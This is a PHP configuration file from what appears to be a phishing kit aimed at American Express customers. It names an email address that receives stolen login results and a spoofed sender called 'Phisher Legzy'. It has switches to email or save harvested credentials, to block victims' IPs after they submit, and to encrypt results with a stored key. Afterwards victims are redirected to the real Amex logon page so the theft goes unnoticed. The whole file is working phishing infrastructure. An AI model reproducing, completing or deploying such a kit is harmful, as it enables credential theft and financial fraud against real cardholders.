<?php
$Your_Email = "northbryan4u@gmail.com";  // Set your email
// Primarly used for servers that require valid matching domain in order to submit results 
$From_Email = "Phisher Legzy<ph1shing@logz.cz>";
$Send_Log=1;  // Sends results to above email
$Save_Log=0;  // Saves results to server within a txt file
$Abuse_Filter=1; // Abuse filter: This blocks users from sending you abuse
// Exit link where user will be redirected after completion and users with blocked ip's
$Exit_Link = "https://online.americanexpress.com/myca/logon/us/action/LogonHandler?request_type=LogonHandler&Face=en_US";
$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending fake forms
$Encrypt=0; // Encrypt: This feature encrypts your results
$Key = 	"oL^11tj)1#B)Bh_1y0e.e252OT1ceZ"; // This key is used to decrypt results and can be changed
?>
